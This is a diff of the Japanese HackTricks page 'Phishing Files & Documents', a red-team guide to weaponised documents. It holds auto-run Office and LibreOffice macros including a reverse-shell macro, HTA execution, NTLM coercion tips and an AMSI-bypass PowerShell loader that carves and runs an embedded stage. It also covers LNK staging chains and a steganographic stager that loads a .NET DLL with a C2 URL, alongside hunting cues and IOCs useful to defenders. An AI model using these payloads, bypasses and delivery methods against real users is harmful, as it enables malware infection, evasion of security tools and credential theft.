@@ -1,35 +1,33 @@
 # Phishing Files & Documents
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Office Documents
 
-Microsoft Word は、ファイルを開く前にファイルデータの検証を実行します。データ検証は、OfficeOpenXML standard に照らしたデータ構造の識別という形で実行されます。データ構造の識別中にエラーが発生した場合、分析中のファイルは開かれません。
+Microsoft Word はファイルを開く前にファイルデータの検証を実行します。データ検証は、OfficeOpenXML 標準に基づくデータ構造の識別という形式で実行されます。データ構造の識別中にエラーが発生した場合、分析対象のファイルは開かれません。
 
-通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。ただし、ファイル拡張子を変更してファイル名を変更しても、macro の実行機能を維持することが可能です。\
-たとえば、RTF ファイルは設計上 macros をサポートしていません。しかし、DOCM ファイルの名前を RTF に変更すると、Microsoft Word によって処理され、macro を実行できるようになります。\
+通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。ただし、ファイル拡張子を変更してファイル名を変更しても、macros の実行機能を維持することが可能です。\
+たとえば、RTF ファイルは設計上 macros をサポートしていませんが、RTF に名前を変更した DOCM ファイルは Microsoft Word によって処理され、macro を実行できます。\
 同じ内部構造とメカニズムが、Microsoft Office Suite のすべてのソフトウェア（Excel、PowerPoint など）に適用されます。
 
 一部の Office プログラムによって実行される拡張子を確認するには、次のコマンドを使用できます。
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+DOCX files that reference a remote template (File –Options –Add-ins –Manage: Templates –Go) containing macros can also “execute” macros.
 
 ### External Image Load
 
 Go to: _Insert --> Quick Parts --> Field_\
 _**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
-![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)
+![Office Documents - External Image Load: Insert --> Quick Parts --> Field に移動](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-ドキュメントから任意のコードを実行するために macros を使用できます。
+Macros can be used to run arbitrary code from the document.
 
 #### Autoload functions
 
-一般的なものほど、AV に検出される可能性が高くなります。
+The more common they are, the more likely AV is to detect them.
 
 - AutoOpen()
 - Document_Open()
@@ -66,12 +64,12 @@ proc.Create "powershell <beacon line generated>
 ```
 #### メタデータを手動で削除
 
-**File > Info > Inspect Document > Inspect Document** の順に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。
+**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。
 
 #### Doc Extension
 
-完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
-これは、**`.docx` 内には macro を保存できず**、macro-enabled **`.docm`** 拡張子には**偏見**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。そのため、この**legacy `.doc` 拡張子が最善の妥協案**です。
+完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
+これは、**`.docx` 内には macro を保存できず**、macro-enabled **`.docm`** 拡張子には**悪い印象**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。したがって、この**legacy `.doc` 拡張子が最良の妥協案**です。
 
 #### Malicious Macros Generators
 
@@ -79,26 +77,26 @@ proc.Create "powershell <beacon line generated>
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## LibreOffice ODT auto-run macros (Basic)
+## LibreOffice ODT の自動実行 macro (Basic)
 
-LibreOffice Writer ドキュメントには Basic macros を埋め込み、macro を **Open Document** event にバインドすることで、ファイルを開いたときに自動実行できます（Tools → Customize → Events → Open Document → Macro…）。<sup>[[1]](#references)</sup> シンプルな reverse shell macro は次のようになります。
+LibreOffice Writer のドキュメントには Basic macro を埋め込み、macro を **Open Document** イベント（Tools → Customize → Events → Open Document → Macro…）にバインドすることで、ファイルを開いたときに自動実行できます。<sup>[[1]](#references)</sup> 単純な reverse shell macro は次のようになります。
 ```vb
 Sub Shell
 Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
 End Sub
 ```
-二重引用符（`""`）が文字列内にあることに注意してください。LibreOffice Basicでは、リテラルの引用符をエスケープするために二重引用符を使用します。そのため、`...==""")`で終わるpayloadでは、内部のコマンドとShell argumentの両方のバランスが保たれます。
+`""` の二重引用符に注意してください。LibreOffice Basic ではリテラルの引用符をエスケープするために使用されるため、`...==""")` で終わる payload では、内部のコマンドと Shell 引数の両方のバランスが保たれます。
 
 Delivery tips:
 
-- `.odt`として保存し、ドキュメントイベントにmacroをバインドして、開いた直後に実行されるようにします。
-- `swaks`でメールを送信する場合は、`--attach @resume.odt`を使用します（ファイル名の文字列ではなく、ファイルのバイト列を添付ファイルとして送信するため、`@`が必要です）。これは、検証なしで任意の`RCPT TO` recipientを受け入れるSMTPサーバーをabuseする場合に重要です。
+- `.odt` として保存し、ドキュメントイベントに macro をバインドして、開いたときに直ちに実行されるようにします。
+- `swaks` でメールを送信するときは、`--attach @resume.odt` を使用します（添付ファイルとしてファイル名の文字列ではなくファイルのバイト列を送信するには、`@` が必要です）。これは、検証なしで任意の `RCPT TO` recipient を受け入れる SMTP サーバーを悪用する際に重要です。
 
-## HTAファイル
+## HTA Files
 
-HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせた**Windowsプログラムです。ユーザーインターフェースを生成し、ブラウザのsecurity modelによる制約を受けずに、「fully trusted」applicationとして実行されます。
+HTA は、**HTML と scripting languages（VBScript や JScript など）を組み合わせた** Windows program です。ユーザーインターフェースを生成し、browser の security model による制約を受けずに、「fully trusted」application として実行されます。
 
-HTAは**`mshta.exe`**を使用して実行されます。通常、**Internet Explorer**とともにインストールされるため、**`mshta`はIEに依存します**。そのため、IEがuninstallされている場合、HTAは実行できません。
+HTA は **`mshta.exe`** を使用して実行されます。通常、**Internet Explorer とともにインストール**されるため、**`mshta` は IE に依存します**。そのため、IE がアンインストールされている場合、HTA は実行できません。
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -155,9 +153,9 @@ self.close
 ```
 ## NTLM Authentication の強制
 
-**「リモートで」NTLM authentication を強制する方法**はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**非表示の画像**を追加できます（HTTP MitM も可能です）。また、**フォルダーを開くだけで** **authentication** を**トリガーする**ファイルの**アドレス**を被害者に送信することもできます。
+**NTLM authentication "remotely" を強制**する方法はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**不可視の画像**を追加できます（HTTP MitM でも可能？）。また、**フォルダーを開くだけで** **authentication** を**トリガー**するファイルの**アドレス**を被害者に送信することもできます。
 
-**以下のページで、これらのアイデアやその他の方法を確認してください：**
+**これらのアイデアやその他の方法については、以下のページを確認してください：**
 
 
 {{#ref}}
@@ -171,22 +169,22 @@ self.close
 
 ### NTLM Relay
 
-hash や authentication を盗むだけでなく、**NTLM relay attacks** も**実行できる**ことを忘れないでください：
+hash や authentication を盗むだけでなく、**NTLM relay attacks** も**実行できる**ことを忘れないでください。
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
-## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+## LNK Loaders + ZIP-Embedded Payloads（fileless chain）
 
-非常に効果的な campaign では、2 つの正規の decoy documents（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。ポイントは、実際の PowerShell loader が ZIP の raw bytes 内に一意の marker の後ろへ格納され、.lnk がそれを carve して完全にメモリ上で実行することです。<sup>[[2]](#references)</sup>
+非常に効果的な campaign では、2 つの正規の囮ドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。ポイントは、実際の PowerShell loader が ZIP の raw bytes 内で一意の marker の後に格納され、.lnk がそれを carve して完全にメモリ上で実行することです。<sup>[[2]](#references)</sup>
 
-.lnk の PowerShell one-liner によって実装される一般的な flow：
+.lnk の PowerShell one-liner で実装される一般的な flow：
 
-1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の working directory の parent にある一般的な path から、元の ZIP を特定する。
-2) ZIP bytes を読み込み、hardcoded marker（例：xFIQCV）を検索する。marker より後ろにあるすべてのデータが、埋め込まれた PowerShell payload となる。
-3) ZIP を %ProgramData% にコピーしてそこへ展開し、正規のファイルに見せかけるため decoy .docx を開く。
+1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の working directory の parent など、一般的な path から元の ZIP を locate する。
+2) ZIP bytes を読み込み、hardcoded marker（例：xFIQCV）を探す。marker の後にあるすべてのデータが埋め込まれた PowerShell payload です。
+3) ZIP を %ProgramData% に copy してそこに extract し、正規に見せるため囮の .docx を開く。
 4) 現在の process に対して AMSI を bypass する：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) 次の stage を deobfuscate し（例：すべての # 文字を削除する）、メモリ上で実行する。
+5) 次の stage を deobfuscate し（例：すべての # 文字を削除）、メモリ上で execute する。
 
 埋め込まれた stage を carve して実行する PowerShell skeleton の例：
 ```powershell
@@ -205,35 +203,35 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 Invoke-Expression $code
 ```
-注記
-- Delivery では、信頼できる PaaS サブドメイン（例: `*.herokuapp.com`）が悪用されることが多く、payload にゲートを設ける場合があります（IP/UA に基づいて無害な ZIP を配信するなど）。
-- 次の stage では、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行して、ディスク上の痕跡を最小限に抑えることが頻繁に行われます。
+Notes
+- Delivery では、評判の良い PaaS サブドメイン（例: *.herokuapp.com）が悪用されることが多く、payload にゲートが設定される場合があります（IP/UA に基づいて無害な ZIP を配信するなど）。
+- 次のステージでは、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc を介して実行することが多く、ディスク上の痕跡を最小限に抑えます。
 
 同じ chain で使用される Persistence
-- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer またはそれを埋め込む任意のアプリが payload を自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使用できる commands はこちらを参照してください:
+- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer、またはこれを埋め込む任意のアプリが payload を自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使用できる commands はこちら:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- アーカイブデータの末尾に ASCII marker string（例: xFIQCV）が付加された ZIP files。
-- 親フォルダおよび user フォルダを列挙して ZIP を見つけ、decoy document を開く .lnk。
-- [System.Management.Automation.AmsiUtils]::amsiInitFailed による AMSI tampering。
-- 信頼できる PaaS domains 配下でホストされた links で終了する、長時間継続する business threads。
+- archive data の末尾に ASCII marker string（例: xFIQCV）が付加された ZIP files。
+- 親フォルダや user フォルダを列挙して ZIP を探し、decoy document を開く .lnk。
+- [System.Management.Automation.AmsiUtils]::amsiInitFailed を使用した AMSI tampering。
+- 信頼された PaaS domains 配下でホストされた links で終了する、長時間継続する business threads。
 
-## LNK の decoy-first staging → scheduled-task persistence → trusted CPL side-loading
+## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading
 
-もう 1 つの繰り返し見られる pattern は、バックグラウンドで実際の chain を staging しながら、無害な lure を直ちに開く **document-impersonating `.lnk`** です。<sup>[[3]](#references)</sup>
+もう1つのよく見られる pattern は、**文書を偽装する `.lnk`** で、無害な lure を直ちに開きながら、バックグラウンドで実際の chain を staging するものです。<sup>[[3]](#references)</sup>
 
-観測された workflow:
-1. shortcut は **PDF を装い**、`conhost.exe` または類似の proxy を使用して、obfuscated PowerShell downloader を spawn します。
-2. PowerShell は明白な tokens（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を fragment 化するため、`iwr`、`gci`、`ren`、`cpi`、`schtasks` を探す naive detections では command を見逃します。
-3. stager は最初に **decoy document を download** し、victim のために開いた後、バックグラウンドで malicious files を再構築します。
-4. payloads は **junk extensions** を付けて書き込まれ、その後 filler characters を削除して rename される場合があります。これにより、明白な `.exe` / `.cpl` artifacts の出現が遅延します。
-5. user-writable path から trusted host binary を launch する **minute-based scheduled task** により Persistence が確立されます。
+確認された workflow:
+1. shortcut は **PDF を偽装**し、`conhost.exe` または同様の proxy を使用して、obfuscated PowerShell downloader を起動します。
+2. PowerShell は明白な tokens（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を fragment 化するため、`iwr`、`gci`、`ren`、`cpi`、または `schtasks` を探す単純な detections では command を見逃します。
+3. stager は最初に **decoy document を download**し、victim のために開いた後、バックグラウンドで malicious files を再構築します。
+4. payloads は **junk extensions** で書き込まれた後、filler characters を取り除いて rename される場合があり、明白な `.exe` / `.cpl` artifacts の出現を遅らせます。
+5. user-writable path から trusted host binary を起動する **minute-based scheduled task** によって Persistence が確立されます。
 
-この pattern における最小限の hunting clues:
+この pattern から得られる最小限の hunting clues:
 ```powershell
 # Suspicious split-token PowerShell seen in LNK chains
 iw''r
@@ -246,19 +244,19 @@ r''e''n
 - `C:\Users\Public\<malicious>.cpl` または `.dll`
 - `C:\Windows\Tasks\<blob>.dat`
 
-### second stage が stealthy である理由
+### 2つ目のステージが stealthy である理由
 
-Rapid7 の case study では、scheduled task が **`C:\Users\Public\`** から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に staging され、**`RunFODW`** を export していたため、trusted な Microsoft binary は正規の system copy ではなく、attacker の CPL を side-load しました。
+Rapid7 のケーススタディでは、scheduled task が `C:\Users\Public\` から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に staging され、**`RunFODW`** を export していたため、trusted Microsoft binary は正規の system copy ではなく、攻撃者の CPL を side-load していました。
 
 CPL は次の処理を行います。
-- **AES-256-CBC** の blob を `C:\Windows\Tasks\editor.dat` から読み取る
-- **Windows CNG / `bcrypt.dll`** を介して decrypt する
-- executable memory を allocate し、decrypt した shellcode を copy する
-- shellcode pointer を **`EnumUILanguagesW`** の callback として渡し、間接的に execute する
+- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** blob を読み取る
+- **Windows CNG / `bcrypt.dll`** を介して復号する
+- executable memory を割り当て、復号した shellcode をコピーする
+- shellcode pointer を **`EnumUILanguagesW`** の callback として渡し、間接的に実行する
 
-この最後のステップは個別に hunting する価値があります。malware は、直接的な `((void(*)())buf)()` jump を避け、代わりに **正規の callback を受け取る WinAPI** を悪用して execution を移すことがよくあります。
+この最後の手順は個別に hunting する価値があります。malware は、直接 `((void(*)())buf)()` へ jump することを避け、代わりに **正規の callback を受け取る WinAPI** を悪用して execution を移すことがよくあります。
 
-この campaign で decrypt された payload は **Donut** shellcode でした。その後、最終 PE を完全に memory 内へ map し、execution を引き渡す前に current process 内の **AMSI/WLDP/ETW** を patch しました。side-loading と memory-resident post-processing の詳細については、次を参照してください。
+この campaign で復号された payload は **Donut** shellcode でした。その後、最終 PE を完全に memory 内へ map し、execution を引き渡す前に current process 内の **AMSI/WLDP/ETW** を patch しました。side-loading と memory-resident post-processing の詳しい notes については、以下を参照してください。
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
@@ -268,21 +266,21 @@ CPL は次の処理を行います。
 ../../windows-hardening/av-bypass.md
 {{#endref}}
 
-実践的な hunting pivot:
-- `.lnk` が `powershell.exe` または `conhost.exe` を spawn し、その後に目に見える decoy document が表示されるケース。
-- **`C:\Users\Public\`** への短時間の download の後、nonsense extension から直ちに rename されるケース。
-- `GoogleErrorReport` のような目立たない名前で、**user-writable directory** から実行される scheduled task。
-- 同じ non-system directory から **`.cpl` / `.dll`** ファイルを load する trusted binary。
-- **`C:\Windows\Tasks\`** 配下に書き込まれ、side-loaded module によって読み取られる Base64 text blob。
+実用的な hunting pivot:
+- `powershell.exe` または `conhost.exe` を spawn する `.lnk` に続いて、目に見える decoy document が表示される。
+- **`C:\Users\Public\`** への短時間の download に続いて、意味のない拡張子から直ちに rename される。
+- `GoogleErrorReport` のような目立たない名前で、**user-writable directories** から実行する scheduled task。
+- 同じ non-system directory から **`.cpl` / `.dll`** files を load する trusted binaries。
+- **`C:\Windows\Tasks\`** 配下に書き込まれ、side-loaded module によって読み取られる Base64 text blobs。
 
-## 画像内の steganography-delimited payload（PowerShell stager）
+## 画像内の Steganography-delimited payload（PowerShell stager）
 
-Recent loader chain では、obfuscated JavaScript/VBS を配布し、それが decode して Base64 PowerShell stager を実行します。この stager は image（多くの場合 GIF）を download します。その image には、固有の start/end marker の間に plain text として隠された、Base64-encoded .NET DLL が含まれています。script はこれらの delimiter（実際の環境で確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間の text を extract して Base64-decode し、assembly を memory 内に load したうえで、C2 URL とともに既知の entry method を invoke します。<sup>[[5]](#references)</sup>
+最近の loader chain では、obfuscated JavaScript/VBS を配布し、それが embedded Base64 を decode して Base64 PowerShell stager を実行します。この stager は image（多くの場合 GIF）を download します。その image には、固有の start/end marker の間に plain text として隠された、Base64-encoded .NET DLL が含まれています。script はこれらの delimiter（実際に確認されている例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、間にある text を extract して Base64-decode し、assembly を memory 内に load して、C2 URL とともに既知の entry method を invoke します。<sup>[[5]](#references)</sup>
 
 ワークフロー
 - Stage 1: Archived JS/VBS dropper → embedded Base64 を decode → `-nop -w hidden -ep bypass` を指定して PowerShell stager を launch。
-- Stage 2: PowerShell stager → image を download し、marker-delimited Base64 を carve して、.NET DLL を memory 内に load し、C2 URL と options を渡してその method（例: VAI）を call。
-- Stage 3: Loader が final payload を retrieve し、通常は process hollowing によって trusted binary（一般的には MSBuild.exe）へ inject。<sup>[[7]](#references)[[8]](#references)</sup> process hollowing と trusted utility proxy execution の詳細については、次を参照してください。
+- Stage 2: PowerShell stager → image を download → marker-delimited Base64 を carve → .NET DLL を memory 内に load し、C2 URL と options を渡してその method（例: VAI）を call。
+- Stage 3: Loader が final payload を取得し、通常は trusted binary（一般的には MSBuild.exe）へ process hollowing を使用して inject。<sup>[[7]](#references)[[8]](#references)</sup> process hollowing と trusted utility proxy execution の詳細については、こちらを参照してください。
 
 {{#ref}}
 ../../reversing/common-api-used-in-malware.md
@@ -315,12 +313,12 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 ```
 </details>
 
-メモ
-- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーは campaign ごとに異なります。
-- AMSI/ETW bypass と string deobfuscation は、assembly を loading する前に一般的に適用されます。
-- Hunting: downloaded images を既知の delimiter について scan し、images にアクセスして直後に Base64 blobs を decoding する PowerShell を特定します。
+注記
+- これは ATT&CK T1027.003 (steganography/marker-hiding) です。<sup>[[6]](#references)</sup> Marker は campaign ごとに異なります。
+- AMSI/ETW bypass と string deobfuscation は、assembly を loading する前に適用されることが一般的です。
+- Hunting: download された image を既知の delimiter について scan し、image にアクセスして直後に Base64 blob を decoding する PowerShell を特定します。
 
-以下の stego tools と carving techniques も参照してください。
+stego tools と carving techniques も参照してください:
 
 {{#ref}}
 ../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
@@ -328,11 +326,11 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-繰り返し現れる initial stage は、archive 内に配信される小さく、非常に heavily-obfuscated な `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 string を decode し、`-nop -w hidden -ep bypass` を指定して PowerShell を launch し、HTTPS 経由で次の stage を bootstrap することです。<sup>[[5]](#references)</sup>
+繰り返し見られる initial stage は、archive 内に delivered される小さく、強度に obfuscated された `.js` または `.vbs` です。その唯一の目的は、embedded された Base64 string を decoding し、`-nop -w hidden -ep bypass` を指定して PowerShell を launch し、HTTPS 経由で next stage を bootstrap することです。<sup>[[5]](#references)</sup>
 
-Skeleton logic（抽象化）:
-- 自身の file contents を読み取る
-- junk strings 間にある Base64 blob を locate する
+Skeleton logic (abstract):
+- 自身の file contents を読む
+- junk strings の間にある Base64 blob を locate する
 - ASCII PowerShell に decode する
 - `powershell.exe` を invoke する `wscript.exe`/`cscript.exe` で execute する
 
@@ -342,7 +340,7 @@ Hunting cues
 
 ## NTLM hashes を steal する Windows files
 
-**places to steal NTLM creds** に関するページを確認してください:
+**NTLM creds を steal できる places** の page を確認してください:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
@@ -352,12 +350,11 @@ Hunting cues
 ## References
 
 - [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
-- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とする高度な Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Rapid7 – Malware à la Mode: China-Themed Loader Chain を通じた Dropping Elephant Tradecraft の Tracking](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
+- [4] [Hijack the TypeLib – 新しい COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI Loader が複数の Infostealers を Deliver](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
 - [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
 - [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
-
 {{#include ../../banners/hacktricks-training.md}}
